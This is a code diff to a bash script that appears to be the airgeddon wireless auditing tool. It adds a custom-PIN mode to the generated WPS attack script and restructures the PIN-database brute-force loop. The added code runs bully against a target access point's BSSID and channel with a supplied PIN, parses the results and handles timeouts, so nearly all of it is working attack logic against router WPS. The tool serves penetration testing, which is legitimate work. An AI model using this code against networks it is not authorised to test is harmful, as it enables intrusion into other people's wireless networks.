@@ -1,6 +1,6 @@
 #!/bin/bash
 
-airgeddon_version="5.1"
+airgeddon_version="5.11"
 
 #Enabled 1 / Disabled 0 - Debug mode for faster development skipping intro and initial checks - Default value 0
 debug_mode=0
@@ -4597,12 +4597,14 @@ function exec_wps_custom_pin_bully_attack() {
 	echo
 	language_strings "${language}" 32 "green"
 
+	set_wps_attack_script "bully" "custompin"
+
 	echo
 	language_strings "${language}" 33 "yellow"
 	language_strings "${language}" 366 "blue"
 	language_strings "${language}" 4 "read"
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS custom pin bully attack" -e "bully ${interface} -b ${wps_bssid} -c ${wps_channel} -L -F -B -p ${custom_pin} -v ${bully_verbosity} && echo \"Close this window\"" > /dev/null 2>&1
+	xterm -hold -bg black -fg red -geometry "${g2_stdleft_window}" -T "WPS custom pin bully attack" -e "bash \"${tmpdir}${wps_attack_script_file}\"" > /dev/null 2>&1
 }
 
 #Execute wps custom pin reaver attack
@@ -6826,9 +6828,9 @@ function set_wps_attack_script() {
 			"pindb")
 				attack_cmd1="bully \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -L -F -B -v ${bully_verbosity} -p "
 			;;
-			#"custompin")
-				#TODO pending
-			#;;
+			"custompin")
+				attack_cmd1="bully \${script_interface} -b \${script_wps_bssid} -c \${script_wps_channel} -L -F -B -v ${bully_verbosity} -p ${custom_pin}"
+			;;
 			#"pixiedust")
 				#TODO pending
 			#;;
@@ -6930,61 +6932,92 @@ function set_wps_attack_script() {
 		}
 
 		pin_cracked=0
-		if [ "${script_wps_attack_mode}" = "pindb" ]; then
-			this_pin_timeout=0
-			for current_pin in "${script_pins_found[@]}"; do
-				possible_bully_timeout=0
-				if [ ${attack_pin_counter} -ne 1 ]; then
-					sleep 1.5
-				fi
-				bad_attack_this_pin_counter=0
-				if [ "${this_pin_timeout}" -eq 1 ]; then
-					print_pin_timeout
-				fi
+		this_pin_timeout=0
+		case ${script_wps_attack_mode} in
+			"pindb")
+				for current_pin in "${script_pins_found[@]}"; do
+					possible_bully_timeout=0
+					if [ ${attack_pin_counter} -ne 1 ]; then
+						sleep 1.5
+					fi
+					bad_attack_this_pin_counter=0
+					if [ "${this_pin_timeout}" -eq 1 ]; then
+						print_pin_timeout
+					fi
 
+					echo
+					echo -e "${pin_header1}${current_pin}${pin_header2}${attack_pin_counter}/${#script_pins_found[@]}${pin_header3}"
+					if [ "${script_wps_attack_tool}" = "bully" ]; then
+						echo
+					fi
+
+					this_pin_timeout=0
+					(set -o pipefail && eval "${script_attack_cmd1}${current_pin}${script_attack_cmd2}")
+					if [ "$?" = "124" ]; then
+						if [ "${script_wps_attack_tool}" = "reaver" ]; then
+							this_pin_timeout=1
+						else
+							possible_bully_timeout=1
+						fi
+					fi
+					attack_pin_counter=$((attack_pin_counter + 1))
+					parse_output
+					output="$?"
+					if [ "${output}" = "0" ]; then
+						break
+					elif [ "${output}" = "1" ]; then
+						this_pin_timeout=1
+						continue
+					elif [ "${output}" = "2" ]; then
+						continue
+					elif [[ "${output}" = "3" ]] || [[ "${this_pin_timeout}" -eq 1 ]] || [[ ${possible_bully_timeout} -eq 1 ]]; then
+						if [ "${this_pin_timeout}" -eq 1 ]; then
+							continue
+						fi
+						bad_attack_this_pin_counter=$((bad_attack_this_pin_counter + 1))
+						if [ ${bad_attack_this_pin_counter} -eq 3 ]; then
+							this_pin_timeout=1
+							continue
+						fi
+						if [ ${possible_bully_timeout} -eq 1 ]; then
+							this_pin_timeout=1
+							continue
+						fi
+					fi
+				done
+			;;
+			"custompin")
+				possible_bully_timeout=0
 				echo
-				echo -e "${pin_header1}${current_pin}${pin_header2}${attack_pin_counter}/${#script_pins_found[@]}${pin_header3}"
+				echo -e "${pin_header1}${current_pin}${pin_header2}${attack_pin_counter}/1${pin_header3}"
 				if [ "${script_wps_attack_tool}" = "bully" ]; then
 					echo
 				fi
 
-				this_pin_timeout=0
 				(set -o pipefail && eval "${script_attack_cmd1}${current_pin}${script_attack_cmd2}")
 				if [ "$?" = "124" ]; then
-				 	if [ "${script_wps_attack_tool}" = "reaver" ]; then
+					if [ "${script_wps_attack_tool}" = "reaver" ]; then
 						this_pin_timeout=1
 					else
 						possible_bully_timeout=1
 					fi
 				fi
-				attack_pin_counter=$((attack_pin_counter + 1))
+
 				parse_output
 				output="$?"
-				if [ "${output}" = "0" ]; then
-					break
-				elif [ "${output}" = "1" ]; then
-					this_pin_timeout=1
-					continue
-				elif [ "${output}" = "2" ]; then
-					continue
-				elif [[ "${output}" = "3" ]] || [[ "${this_pin_timeout}" -eq 1 ]] || [[ ${possible_bully_timeout} -eq 1 ]]; then
-					if [ "${this_pin_timeout}" -eq 1 ]; then
-						continue
-					fi
-					bad_attack_this_pin_counter=$((bad_attack_this_pin_counter + 1))
-					if [ ${bad_attack_this_pin_counter} -eq 3 ]; then
-						this_pin_timeout=1
-						continue
-					fi
-					if [ ${possible_bully_timeout} -eq 1 ]; then
-						this_pin_timeout=1
-						continue
+				if [[ "${output}" != "0" ]] && [[ "${output}" != "2" ]]; then
+					if [ "${this_pin_timeout}" -ne 1 ]; then
+						if [ "${output}" = "1" ]; then
+							this_pin_timeout=1
+						elif [ ${possible_bully_timeout} -eq 1 ]; then
+							if [ ${possible_bully_timeout} -eq 1 ]; then
+								this_pin_timeout=1
+							fi
+						fi
 					fi
 				fi
-			done
-		#else
-			#TODO pending
-		fi
+			;;
+		esac
 
 		if [ ${pin_cracked} -eq 1 ]; then
 	EOF
